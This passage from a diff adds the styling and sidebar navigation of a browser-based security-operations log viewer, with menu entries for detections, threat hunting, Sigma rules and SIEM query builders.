@@ -1,0 +1,2666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SOC Log Viewer — Cyber Ops Center</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  :root{
+    --bg:#0B0F14;
+    --panel:#111820;
+    --panel-2:#161E27;
+    --border:#212B35;
+    --text:#E6EDF3;
+    --text-dim:#8B98A5;
+    --text-faint:#556270;
+    --accent:#5FA8D3;
+    --accent-dim:#3A6E8F;
+    --crit:#E5484D;
+    --high:#F2994A;
+    --med:#F2C94C;
+    --low:#3DBE7A;
+    --info:#5FA8D3;
+    --mono: "SF Mono", "Cascadia Code", Consolas, "Courier New", monospace;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, sans-serif;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:var(--sans);height:100%;}
+  ::selection{background:var(--accent-dim);color:#fff;}
+  a{color:var(--accent);}
+  ::-webkit-scrollbar{width:10px;height:10px;}
+  ::-webkit-scrollbar-track{background:var(--bg);}
+  ::-webkit-scrollbar-thumb{background:#25313d;border-radius:5px;}
+
+  #app{display:flex;height:100vh;}
+
+  /* ---------- Sidebar ---------- */
+  #sidebar{width:230px;min-width:230px;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;padding:16px 10px;overflow-y:auto;}
+  .brand{display:flex;align-items:center;gap:10px;padding:6px 8px 16px 8px;}
+  .brand .dot{width:10px;height:10px;border-radius:3px;background:var(--accent);box-shadow:0 0 12px var(--accent);flex-shrink:0;}
+  .brand div b{display:block;font-size:13.5px;letter-spacing:.3px;}
+  .brand div span{display:block;font-size:10px;color:var(--text-faint);letter-spacing:1.5px;text-transform:uppercase;}
+  .nav-group-label{font-size:9.5px;letter-spacing:1.2px;text-transform:uppercase;color:var(--text-faint);padding:12px 10px 5px;}
+  .nav-item{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:8px 10px;border-radius:6px;font-size:12.5px;color:var(--text-dim);cursor:pointer;margin-bottom:1px;border:1px solid transparent;}
+  .nav-item:hover{background:var(--panel-2);color:var(--text);}
+  .nav-item.active{background:#152029;color:var(--text);border-color:var(--border);}
+  .nav-item .badge{background:#26313c;color:var(--text-dim);font-size:10px;padding:1px 6px;border-radius:20px;min-width:16px;text-align:center;}
+  .nav-item.active .badge{background:var(--accent-dim);color:#fff;}
+  .nav-item .badge.crit{background:var(--crit);color:#fff;}
+  .nav-sep{height:1px;background:var(--border);margin:8px 4px;}
+  .sidebar-footer{margin-top:auto;padding:10px 8px;font-size:10.5px;color:var(--text-faint);border-top:1px solid var(--border);}
+
+  /* ---------- Topbar ---------- */
+  #main{flex:1;display:flex;flex-direction:column;min-width:0;}
+  #topbar{height:52px;min-height:52px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 18px;background:var(--panel);}
+  #topbar .title{font-size:13.5px;font-weight:600;}
+  #topbar .sub{font-size:11px;color:var(--text-faint);margin-left:8px;}
+  .pill{font-size:10px;padding:2px 8px;border-radius:20px;background:#1c2530;color:var(--text-dim);border:1px solid var(--border);}
+  .btn{background:var(--accent);color:#06121c;border:none;padding:7px 13px;border-radius:6px;font-size:12.5px;font-weight:600;cursor:pointer;}
+  .btn:hover{filter:brightness(1.1);}
+  .btn.ghost{background:transparent;border:1px solid var(--border);color:var(--text-dim);}
+  .btn.ghost:hover{color:var(--text);border-color:var(--accent-dim);}
+  .btn.sm{padding:4px 9px;font-size:11px;}
+
+  #content{flex:1;overflow-y:auto;padding:22px 26px 60px;}
+  .section-title{font-size:11px;letter-spacing:1.4px;text-transform:uppercase;color:var(--text-faint);margin:0 0 14px;display:flex;align-items:center;gap:8px;}
+  .section-title .line{flex:1;height:1px;background:var(--border);}
+  .view-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;}
+  .view-head h2{margin:0;font-size:15px;}
+  .view-head p{margin:2px 0 0;font-size:11.5px;color:var(--text-faint);}
+
+  /* ---------- Upload ---------- */
+  .dropzone{border:1.5px dashed var(--border);border-radius:10px;padding:50px 20px;text-align:center;background:var(--panel);}
+  .dropzone h3{margin:14px 0 4px;font-size:15px;}
+  .dropzone p{margin:0;color:var(--text-faint);font-size:12.5px;}
+  .fmt-row{display:flex;gap:6px;justify-content:center;flex-wrap:wrap;margin:18px 0;}
+  .fmt-chip{font-size:10px;padding:3px 9px;border-radius:5px;background:#1a232d;color:var(--text-dim);border:1px solid var(--border);}
+  .upload-actions{display:flex;gap:10px;justify-content:center;margin-top:8px;flex-wrap:wrap;}
+  textarea#pasteBox{width:100%;background:#0d1319;border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--mono);font-size:12px;padding:12px;min-height:110px;margin-top:14px;resize:vertical;}
+  #fileInput{display:none;}
+
+  /* ---------- KPI cards ---------- */
+  .kpi-row{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin-bottom:22px;}
+  .kpi{background:var(--panel);border:1px solid var(--border);border-radius:9px;padding:14px 16px;}
+  .kpi b{display:block;font-size:24px;font-family:var(--mono);}
+  .kpi span{font-size:10.5px;color:var(--text-faint);text-transform:uppercase;letter-spacing:.6px;}
+  .kpi.crit b{color:var(--crit);} .kpi.high b{color:var(--high);}
+
+  .grid2{display:grid;grid-template-columns:1.3fr 1fr;gap:16px;margin-bottom:20px;}
+  .panel{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px;}
+  .panel h4{margin:0 0 12px;font-size:12px;color:var(--text-dim);text-transform:uppercase;letter-spacing:.6px;}
+  .bar-row{display:flex;align-items:center;gap:10px;margin-bottom:9px;font-size:12px;}
+  .bar-row .label{width:140px;color:var(--text-dim);flex-shrink:0;}
+  .bar-track{flex:1;height:8px;background:#1a232d;border-radius:4px;overflow:hidden;}
+  .bar-fill{height:100%;background:var(--accent);border-radius:4px;}
+  .bar-row .count{width:36px;text-align:right;font-family:var(--mono);color:var(--text-dim);}
+
+  .sev-legend{display:flex;gap:14px;margin-top:10px;flex-wrap:wrap;}
+  .sev-legend span{font-size:11px;color:var(--text-dim);display:flex;align-items:center;gap:5px;}
+  .sw{width:9px;height:9px;border-radius:2px;display:inline-block;}
+
+  /* ---------- Table ---------- */
+  table{width:100%;border-collapse:collapse;font-size:12px;font-family:var(--mono);}
+  thead th{position:sticky;top:0;background:var(--panel-2);text-align:left;padding:8px 10px;font-family:var(--sans);font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;color:var(--text-faint);border-bottom:1px solid var(--border);cursor:pointer;user-select:none;}
+  thead th:hover{color:var(--text);}
+  tbody td{padding:7px 10px;border-bottom:1px solid #17202a;color:var(--text-dim);white-space:nowrap;max-width:220px;overflow:hidden;text-overflow:ellipsis;}
+  tbody tr:hover{background:#131b23;}
+  tbody tr:hover td{color:var(--text);}
+  .sev-tag{font-size:9.5px;font-weight:700;padding:2px 7px;border-radius:4px;letter-spacing:.4px;white-space:nowrap;}
+  .sev-CRITICAL{background:rgba(229,72,77,.15);color:var(--crit);}
+  .sev-HIGH{background:rgba(242,153,74,.15);color:var(--high);}
+  .sev-MEDIUM{background:rgba(242,201,76,.15);color:var(--med);}
+  .sev-LOW{background:rgba(61,190,122,.15);color:var(--low);}
+  .toolbar{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;align-items:center;}
+  .toolbar input, .toolbar select{background:#0d1319;border:1px solid var(--border);color:var(--text);padding:7px 10px;border-radius:6px;font-size:12px;}
+  .toolbar input{flex:1;min-width:180px;}
+  .table-wrap{max-height:560px;overflow:auto;border:1px solid var(--border);border-radius:8px;}
+
+  /* ---------- Detection cards ---------- */
+  .det-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px;}
+  .det-card{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:8px;padding:14px 16px;cursor:pointer;}
+  .det-card:hover{border-color:var(--accent);}
+  .det-card.CRITICAL{border-left-color:var(--crit);}
+  .det-card.HIGH{border-left-color:var(--high);}
+  .det-card.MEDIUM{border-left-color:var(--med);}
+  .det-card.LOW{border-left-color:var(--low);}
+  .det-card .top{display:flex;justify-content:space-between;align-items:flex-start;gap:8px;}
+  .det-card h5{margin:0;font-size:13px;}
+  .det-card .meta{font-size:10.5px;color:var(--text-faint);margin-top:4px;font-family:var(--mono);}
+  .det-card .ex{margin-top:10px;font-size:11px;color:var(--text-dim);font-family:var(--mono);background:#0d1319;padding:7px 9px;border-radius:5px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  .det-card .count{font-family:var(--mono);font-size:11px;color:var(--text-faint);margin-top:8px;}
+  .det-detail{grid-column:1/-1;background:#0d1319;border:1px solid var(--border);border-radius:8px;padding:16px 18px;font-size:12px;}
+  .det-detail h5{margin:0 0 10px;font-size:13px;}
+  .kv-table{width:100%;font-family:var(--mono);font-size:11.5px;}
+  .kv-table td{padding:4px 8px;border-bottom:1px solid #17202a;color:var(--text-dim);}
+  .kv-table td:first-child{color:var(--text-faint);width:130px;}
+  .raw-json{background:#080c10;border:1px solid var(--border);border-radius:6px;padding:10px;margin-top:10px;font-family:var(--mono);font-size:10.5px;color:var(--text-dim);max-height:220px;overflow:auto;white-space:pre-wrap;}
+
+  /* ---------- Timeline / Attack story ---------- */
+  .entity-block{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px 18px;margin-bottom:14px;}
+  .entity-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap;}
+  .entity-head b{font-size:14px;}
+  .entity-head .tag{font-size:10px;color:var(--text-faint);border:1px solid var(--border);padding:1px 7px;border-radius:20px;}
+  .tl{position:relative;padding-left:26px;}
+  .tl::before{content:"";position:absolute;left:9px;top:4px;bottom:4px;width:1.5px;background:var(--border);}
+  .tl-item{position:relative;padding:0 0 16px 14px;}
+  .tl-item .num{position:absolute;left:-26px;top:-2px;width:18px;height:18px;border-radius:50%;background:var(--accent);color:#06121c;font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;border:2px solid var(--bg);}
+  .tl-item.CRITICAL .num{background:var(--crit);color:#fff;}
+  .tl-item.HIGH .num{background:var(--high);color:#1a1000;}
+  .tl-item.MEDIUM .num{background:var(--med);color:#1a1000;}
+  .tl-item.LOW .num{background:var(--low);color:#04140a;}
+  .tl-item .ts{font-family:var(--mono);font-size:10.5px;color:var(--text-faint);}
+  .tl-item .ttl{font-size:12.5px;margin:2px 0;}
+  .tl-item .cl{font-family:var(--mono);font-size:11px;color:var(--text-dim);background:#0d1319;padding:5px 8px;border-radius:5px;display:inline-block;margin-top:3px;}
+  .tac{font-size:9px;font-weight:700;text-transform:uppercase;padding:1px 6px;border-radius:4px;background:#1c2530;color:var(--accent);margin-right:6px;}
+  .tac.CredentialAccess,.tac.CredentialAccess{color:var(--crit);}
+
+  /* ---------- IOC ---------- */
+  .ioc-section{margin-bottom:20px;}
+  .ioc-section h4{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:var(--text-faint);margin-bottom:10px;}
+  .chip-row{display:flex;flex-wrap:wrap;gap:6px;}
+  .chip{font-family:var(--mono);font-size:11px;background:#151d26;border:1px solid var(--border);color:var(--text-dim);padding:4px 9px;border-radius:5px;cursor:default;}
+  .chip.flag{border-color:rgba(229,72,77,.4);color:#ff9a9d;background:rgba(229,72,77,.08);}
+  .chip.clickable{cursor:pointer;}
+  .chip.clickable:hover{border-color:var(--accent);color:var(--text);}
+  .chip .sub{color:var(--text-faint);margin-left:5px;}
+
+  /* ---------- Users / UEBA ---------- */
+  .ueba-tabs{display:flex;gap:4px;margin-bottom:14px;}
+  .ueba-tab{padding:7px 14px;border-radius:6px;font-size:12px;color:var(--text-dim);cursor:pointer;border:1px solid transparent;}
+  .ueba-tab.active{background:var(--panel-2);color:var(--text);border-color:var(--border);}
+  .user-row{display:grid;grid-template-columns:110px 1fr 46px auto;align-items:center;gap:14px;padding:12px 6px;border-bottom:1px solid #17202a;font-size:12.5px;}
+  .user-row .name{font-family:var(--mono);}
+  .risk-track{height:7px;background:#1a232d;border-radius:4px;overflow:hidden;}
+  .risk-fill{height:100%;}
+  .risk-score{font-family:var(--mono);text-align:right;}
+  .risk-meta{display:flex;gap:6px;flex-wrap:wrap;align-items:center;}
+  .risk-meta .tag{font-size:9.5px;color:var(--text-faint);border:1px solid var(--border);padding:1px 6px;border-radius:20px;white-space:nowrap;}
+  .risk-actions{display:flex;gap:6px;}
+
+  /* ---------- Network graph ---------- */
+  .net-cols{display:flex;justify-content:space-between;font-size:10px;text-transform:uppercase;letter-spacing:.8px;color:var(--text-faint);margin-bottom:6px;padding:0 20px;}
+  .net-node{font-family:var(--mono);font-size:11px;background:#151d26;border:1px solid var(--border);border-radius:5px;padding:4px 10px;display:inline-flex;gap:8px;align-items:center;}
+  .net-node .n{color:var(--text-faint);font-size:10px;}
+  .net-node.src{border-color:var(--accent-dim);}
+  .net-node.dst{border-color:#2b5c40;}
+  .net-node.sus{border-color:var(--crit);color:#ff9a9d;}
+
+  /* ---------- Tree / Process tree ---------- */
+  .tree-host{margin-bottom:16px;}
+  .tree-host > .host-name{font-family:var(--mono);font-size:12.5px;color:var(--accent);margin-bottom:8px;display:flex;align-items:center;gap:8px;}
+  .tree-branch{padding-left:18px;border-left:1px dashed var(--border);margin-left:6px;}
+  .tree-node{font-family:var(--mono);font-size:11.5px;padding:4px 0;color:var(--text-dim);}
+  .tree-node .proc{color:var(--text);}
+  .tree-node .cmd{color:var(--text-faint);font-size:10.5px;margin-left:4px;}
+  .tree-node.flag{color:var(--high);}
+  .tree-node.flag .proc{color:var(--crit);}
+
+  /* ---------- Query builder ---------- */
+  .qb-layout{display:grid;grid-template-columns:280px 1fr;gap:16px;height:calc(100vh - 170px);}
+  .qb-list{overflow-y:auto;border:1px solid var(--border);border-radius:8px;background:var(--panel);}
+  .qb-search{padding:10px;border-bottom:1px solid var(--border);}
+  .qb-search input{width:100%;background:#0d1319;border:1px solid var(--border);color:var(--text);padding:7px 10px;border-radius:6px;font-size:12px;}
+  .qb-cat{font-size:9.5px;text-transform:uppercase;letter-spacing:1px;color:var(--text-faint);padding:10px 12px 4px;}
+  .qb-item{padding:8px 12px;font-size:12px;color:var(--text-dim);cursor:pointer;display:flex;justify-content:space-between;align-items:center;border-left:2px solid transparent;}
+  .qb-item:hover{background:var(--panel-2);color:var(--text);}
+  .qb-item.active{background:#152029;color:var(--text);border-left-color:var(--accent);}
+  .qb-item .sev-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0;margin-right:7px;}
+  .qb-detail{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:18px 20px;overflow-y:auto;}
+  .qb-detail h3{margin:0 0 4px;font-size:15px;}
+  .qb-detail .desc{color:var(--text-dim);font-size:12.5px;margin-bottom:14px;}
+  .qb-code{background:#080c10;border:1px solid var(--border);border-radius:8px;padding:14px;font-family:var(--mono);font-size:12px;color:#cde3f0;white-space:pre-wrap;line-height:1.6;}
+  .platform-tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap;}
+  .ptab{padding:5px 11px;border-radius:6px;font-size:11.5px;color:var(--text-dim);border:1px solid var(--border);cursor:pointer;}
+  .ptab.active{background:var(--accent-dim);color:#fff;border-color:var(--accent-dim);}
+
+  /* ---------- MITRE Matrix ---------- */
+  .matrix{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;}
+  .matrix-col{background:var(--panel);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
+  .matrix-col .hd{padding:9px 10px;font-size:10.5px;text-transform:uppercase;letter-spacing:.6px;color:var(--text-faint);background:var(--panel-2);border-bottom:1px solid var(--border);}
+  .matrix-cell{padding:9px 10px;border-bottom:1px solid #17202a;font-size:11.5px;}
+  .matrix-cell.hit{background:rgba(95,168,211,.06);}
+  .matrix-cell .t{color:var(--text-dim);}
+  .matrix-cell .n{font-family:var(--mono);color:var(--text-faint);font-size:10px;}
+  .matrix-cell.CRITICAL{border-left:2px solid var(--crit);}
+  .matrix-cell.HIGH{border-left:2px solid var(--high);}
+  .matrix-cell.MEDIUM{border-left:2px solid var(--med);}
+  .matrix-cell.LOW{border-left:2px solid var(--low);}
+  .matrix-empty{padding:14px 10px;color:var(--text-faint);font-size:11px;}
+
+  /* ---------- SOC Tools ---------- */
+  .tool-block{margin-bottom:22px;}
+  .tool-block h4{font-size:10.5px;text-transform:uppercase;letter-spacing:1px;color:var(--text-faint);margin-bottom:10px;}
+  .tool-chip{font-family:var(--mono);font-size:11px;background:#151d26;border:1px solid var(--border);color:var(--text-dim);padding:5px 10px;border-radius:6px;display:inline-flex;align-items:center;gap:8px;cursor:pointer;margin:0 6px 6px 0;}
+  .tool-chip:hover{border-color:var(--accent);color:var(--text);}
+  .tool-chip .op{font-size:9px;color:var(--accent);text-transform:uppercase;letter-spacing:.5px;}
+  .tool-chip.copied{border-color:var(--low);color:var(--low);}
+  .tool-panel{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px 18px;margin-bottom:14px;}
+  .decoded-box{background:#080c10;border:1px solid var(--border);border-radius:6px;padding:10px 12px;font-family:var(--mono);font-size:11px;color:var(--text-dim);margin-top:8px;white-space:pre-wrap;word-break:break-all;}
+  .subnet-calc{display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap;}
+  .subnet-calc input{background:#0d1319;border:1px solid var(--border);color:var(--text);padding:8px 10px;border-radius:6px;font-family:var(--mono);font-size:12px;width:220px;}
+
+  /* ---------- Hunt Pack ---------- */
+  .hunt-card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px 18px;margin-bottom:12px;}
+  .hunt-card .top{display:flex;justify-content:space-between;align-items:flex-start;gap:10px;}
+  .hunt-card h5{margin:0;font-size:13.5px;}
+  .hunt-card .hyp{color:var(--text-dim);font-size:12px;margin:8px 0;line-height:1.5;}
+  .hunt-card .meta{font-size:10.5px;color:var(--text-faint);font-family:var(--mono);}
+  .hunt-status{font-size:9.5px;font-weight:700;padding:2px 8px;border-radius:4px;letter-spacing:.4px;}
+  .hunt-status.hit{background:rgba(229,72,77,.15);color:var(--crit);}
+  .hunt-status.clear{background:rgba(61,190,122,.15);color:var(--low);}
+
+  /* ---------- Alert rules ---------- */
+  .rule-row{display:grid;grid-template-columns:1fr 130px 110px 90px 70px;gap:14px;align-items:center;padding:11px 10px;border-bottom:1px solid #17202a;font-size:12px;}
+  .rule-row .rt{color:var(--text);font-weight:500;}
+  .rule-row .rd{color:var(--text-faint);font-size:10.5px;font-family:var(--mono);margin-top:2px;}
+  .toggle{width:34px;height:18px;border-radius:20px;background:#26313c;position:relative;cursor:pointer;flex-shrink:0;}
+  .toggle.on{background:var(--accent-dim);}
+  .toggle::after{content:"";position:absolute;top:2px;left:2px;width:14px;height:14px;border-radius:50%;background:#8B98A5;transition:left .15s;}
+  .toggle.on::after{left:18px;background:#fff;}
+
+  /* ---------- Notes ---------- */
+  #notesArea{width:100%;min-height:400px;background:var(--panel);border:1px solid var(--border);border-radius:10px;color:var(--text);font-family:var(--mono);font-size:12.5px;padding:16px;resize:vertical;}
+
+  /* ---------- Incident Report ---------- */
+  .report-layout{display:grid;grid-template-columns:230px 1fr;gap:0;background:var(--panel);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
+  .report-toc{border-right:1px solid var(--border);padding:20px 14px;background:var(--panel-2);}
+  .report-toc .eyebrow{font-size:9.5px;text-transform:uppercase;letter-spacing:1.2px;color:var(--text-faint);margin-bottom:12px;}
+  .report-toc a{display:block;padding:7px 8px;font-size:12px;color:var(--text-dim);text-decoration:none;border-radius:5px;margin-bottom:1px;}
+  .report-toc a:hover{background:#1a232d;color:var(--text);}
+  .report-body{padding:26px 30px;}
+  .report-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:22px;}
+  .report-header h1{margin:0;font-size:22px;}
+  .report-header .id{color:var(--text-faint);font-family:var(--mono);font-size:11.5px;margin-top:3px;}
+  .threat-badge{display:inline-block;margin-top:10px;padding:6px 14px;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.5px;}
+  .threat-badge.CRITICAL{background:var(--crit);color:#fff;}
+  .threat-badge.HIGH{background:var(--high);color:#1a1000;}
+  .report-sec{margin-bottom:30px;scroll-margin-top:16px;}
+  .report-sec h2{font-size:14px;border-bottom:1px solid var(--border);padding-bottom:8px;margin-bottom:14px;}
+  .report-sec p{color:var(--text-dim);font-size:12.5px;line-height:1.7;}
+  .report-meta-row{display:flex;gap:22px;font-size:11.5px;color:var(--text-faint);margin-bottom:20px;flex-wrap:wrap;}
+  .report-meta-row b{color:var(--text-dim);}
+  .action-item{display:flex;gap:10px;padding:9px 0;border-bottom:1px solid #17202a;font-size:12.5px;color:var(--text-dim);}
+  .action-item .pr{font-size:9.5px;font-weight:700;padding:1px 7px;border-radius:4px;white-space:nowrap;height:fit-content;}
+
+  .empty-state{color:var(--text-faint);font-size:13px;padding:60px 0;text-align:center;}
+  .hidden{display:none !important;}
+  footer.note{margin-top:30px;font-size:11px;color:var(--text-faint);border-top:1px solid var(--border);padding-top:14px;line-height:1.6;}
+
+  /* ---------- Correlations ---------- */
+  .corr-card{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:8px;padding:14px 16px;margin-bottom:12px;}
+  .corr-card.CRITICAL{border-left-color:var(--crit);} .corr-card.HIGH{border-left-color:var(--high);} .corr-card.MEDIUM{border-left-color:var(--med);}
+  .corr-card .top{display:flex;justify-content:space-between;align-items:flex-start;gap:8px;}
+  .corr-card h5{margin:0;font-size:13px;}
+  .corr-card .desc{font-size:12px;color:var(--text-dim);margin:8px 0;line-height:1.5;}
+  .corr-card .meta{font-size:10.5px;color:var(--text-faint);font-family:var(--mono);}
+
+  /* ---------- Ack / keyboard focus ---------- */
+  .det-card{position:relative;}
+  .det-card.acked{opacity:.45;}
+  .det-card.focused{outline:2px solid var(--accent);outline-offset:2px;}
+  .ack-btn{position:absolute;top:12px;right:12px;font-size:9.5px;padding:3px 8px;border-radius:4px;background:transparent;border:1px solid var(--border);color:var(--text-faint);cursor:pointer;}
+  .ack-btn:hover{color:var(--text);border-color:var(--accent-dim);}
+  .kbd-hint{font-size:11px;color:var(--text-faint);margin-bottom:12px;}
+  .kbd-hint kbd{background:#1a232d;border:1px solid var(--border);border-radius:4px;padding:1px 6px;font-family:var(--mono);font-size:10.5px;color:var(--text-dim);}
+
+  /* ---------- Watchlist / Intel / Sigma ---------- */
+  .intel-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+  textarea.intel-input{width:100%;min-height:140px;background:#0d1319;border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--mono);font-size:12px;padding:12px;resize:vertical;}
+  .sigma-input{width:100%;min-height:260px;background:#0d1319;border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--mono);font-size:12px;padding:12px;resize:vertical;}
+  .sigma-err{background:rgba(229,72,77,.08);border:1px solid rgba(229,72,77,.4);color:#ff9a9d;border-radius:6px;padding:10px 12px;font-size:11.5px;font-family:var(--mono);margin-top:10px;white-space:pre-wrap;}
+  .sigma-ok{background:rgba(61,190,122,.08);border:1px solid rgba(61,190,122,.4);color:var(--low);border-radius:6px;padding:10px 12px;font-size:11.5px;margin-top:10px;}
+  .custom-rule-row{display:flex;justify-content:space-between;align-items:center;padding:10px 12px;border-bottom:1px solid #17202a;font-size:12px;}
+  .custom-rule-row .del{color:var(--crit);cursor:pointer;font-size:11px;border:1px solid rgba(229,72,77,.4);padding:3px 8px;border-radius:4px;}
+
+  /* ---------- Sparkline / peer badge ---------- */
+  .spark{display:inline-block;vertical-align:middle;margin-left:8px;}
+  .peer-flag{font-size:9px;padding:1px 6px;border-radius:20px;background:rgba(242,153,74,.15);color:var(--high);border:1px solid rgba(242,153,74,.3);}
+
+  /* ---------- Session controls ---------- */
+  .session-menu{position:relative;}
+  .session-dropdown{position:absolute;right:0;top:36px;background:var(--panel-2);border:1px solid var(--border);border-radius:8px;padding:8px;min-width:220px;z-index:20;box-shadow:0 8px 24px rgba(0,0,0,.4);}
+  .session-dropdown .si{padding:7px 9px;font-size:12px;color:var(--text-dim);cursor:pointer;border-radius:5px;display:flex;justify-content:space-between;align-items:center;}
+  .session-dropdown .si:hover{background:#1a232d;color:var(--text);}
+  .session-dropdown .lbl{font-size:9.5px;text-transform:uppercase;letter-spacing:.8px;color:var(--text-faint);padding:6px 9px 2px;}
+  .session-dropdown hr{border:none;border-top:1px solid var(--border);margin:6px 0;}
+
+  /* ---------- Rule tests ---------- */
+  .test-row{display:grid;grid-template-columns:1fr 200px 90px;gap:14px;align-items:center;padding:10px 12px;border-bottom:1px solid #17202a;font-size:12px;}
+  .test-pass{color:var(--low);font-weight:700;font-size:11px;}
+  .test-fail{color:var(--crit);font-weight:700;font-size:11px;}
+
+  /* ---------- IP intel chip ---------- */
+  .geo-tag{font-size:9.5px;color:var(--text-faint);border:1px solid var(--border);padding:1px 6px;border-radius:20px;margin-left:6px;}
+
+  /* ---------- Reputation ---------- */
+  .rep-verdict{font-size:9.5px;font-weight:700;padding:2px 8px;border-radius:4px;letter-spacing:.4px;white-space:nowrap;}
+  .rep-verdict.Clean{background:rgba(61,190,122,.15);color:var(--low);}
+  .rep-verdict.Low{background:rgba(95,168,211,.15);color:var(--accent);}
+  .rep-verdict.Suspicious{background:rgba(242,201,76,.15);color:var(--med);}
+  .rep-verdict.Malicious{background:rgba(229,72,77,.15);color:var(--crit);}
+  .rep-row{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:10px;}
+  .rep-row .top{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;}
+  .rep-row .ind{font-family:var(--mono);font-size:12.5px;word-break:break-all;}
+  .rep-score-track{height:6px;background:#1a232d;border-radius:4px;overflow:hidden;margin:8px 0;}
+  .rep-score-fill{height:100%;}
+  .rep-reasons{font-size:11px;color:var(--text-dim);line-height:1.6;margin:0;padding-left:18px;}
+  .rep-live-row{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap;align-items:center;}
+  .rep-live-result{margin-top:8px;background:#080c10;border:1px solid var(--border);border-radius:6px;padding:8px 10px;font-size:11px;font-family:var(--mono);color:var(--text-dim);white-space:pre-wrap;word-break:break-word;}
+  .rep-settings{display:flex;gap:16px;flex-wrap:wrap;align-items:flex-end;margin-bottom:6px;}
+  .rep-settings label{font-size:10.5px;color:var(--text-faint);display:block;margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px;}
+  .rep-settings input{background:#0d1319;border:1px solid var(--border);color:var(--text);padding:8px 10px;border-radius:6px;font-family:var(--mono);font-size:12px;width:260px;}
+  .rep-settings .chk{display:flex;align-items:center;gap:6px;font-size:11.5px;color:var(--text-dim);}
+
+  @media print{
+    #sidebar, #topbar{display:none !important;}
+    #content{padding:0;overflow:visible;}
+    .view.hidden{display:none !important;}
+    body{background:#fff;color:#111;}
+  }
+</style>
+</head>
+<body>
+<div id="app">
+
+  <div id="sidebar">
+    <div class="brand"><div class="dot"></div><div><b>SOC Log Viewer</b><span>Cyber Ops Center</span></div></div>
+
+    <div class="nav-group-label">Overview</div>
+    <div class="nav-item active" data-view="upload"><span>⇪ Upload</span></div>
+    <div class="nav-item" data-view="dashboard"><span>▦ Dashboard</span></div>
+    <div class="nav-item" data-view="network"><span>◎ Network</span></div>
+    <div class="nav-item" data-view="urls"><span>⛓ URLs &amp; Domains</span></div>
+    <div class="nav-item" data-view="process"><span>▤ Process</span></div>
+    <div class="nav-item" data-view="tree"><span>⌥ Tree</span></div>
+    <div class="nav-item" data-view="table"><span>≡ Log Table</span></div>
+    <div class="nav-item" data-view="detections"><span>⛨ Detections</span><span class="badge crit" id="navDetCount">0</span></div>
+    <div class="nav-item" data-view="correlations"><span>🔗 Correlations</span><span class="badge crit" id="navCorrCount">0</span></div>
+    <div class="nav-item" data-view="rules"><span>🔔 Alert Rules</span></div>
+    <div class="nav-item" data-view="ueba"><span>◈ UEBA</span><span class="badge" id="navUebaCount">0</span></div>
+    <div class="nav-item" data-view="story"><span>✎ Attack Story</span><span class="badge crit" id="navStoryCount">0</span></div>
+    <div class="nav-item" data-view="hunt"><span>⚑ Hunt Pack</span><span class="badge" id="navHuntCount">0</span></div>
+    <div class="nav-item" data-view="ptree"><span>🌳 Process Tree</span></div>
+    <div class="nav-item" data-view="fim"><span>🗂 File Integrity (FIM)</span><span class="badge crit" id="navFimCount">0</span></div>
+
+    <div class="nav-sep"></div>
+    <div class="nav-group-label">Enrichment</div>
+    <div class="nav-item" data-view="watchlists"><span>👁 Watchlists &amp; Intel</span></div>
+    <div class="nav-item" data-view="reputation"><span>🛰 Reputation</span><span class="badge crit" id="navRepCount">0</span></div>
+    <div class="nav-item" data-view="customrules"><span>⚙ Custom Rules (Sigma)</span><span class="badge" id="navCustomCount">0</span></div>
+    <div class="nav-item" data-view="ruletests"><span>✓ Rule Tests</span></div>
+
+    <div class="nav-sep"></div>
+    <div class="nav-group-label">Query Builder</div>
+    <div class="nav-item" data-view="qb-crowdstrike"><span>&lt;&gt; CrowdStrike FQL</span></div>
+    <div class="nav-item" data-view="qb-panther"><span>▥ Panther Queries</span></div>
+    <div class="nav-item" data-view="qb-splunk"><span>≻ Splunk SPL</span></div>
+    <div class="nav-item" data-view="qb-sentinel"><span>▦ Sentinel KQL</span></div>
+    <div class="nav-item" data-view="qb-qradar"><span>◇ QRadar AQL</span></div>
+    <div class="nav-item" data-view="qb-s1"><span>◆ SentinelOne PQ</span></div>
+    <div class="nav-item" data-view="mitre"><span>⛰ MITRE ATT&amp;CK</span></div>
+
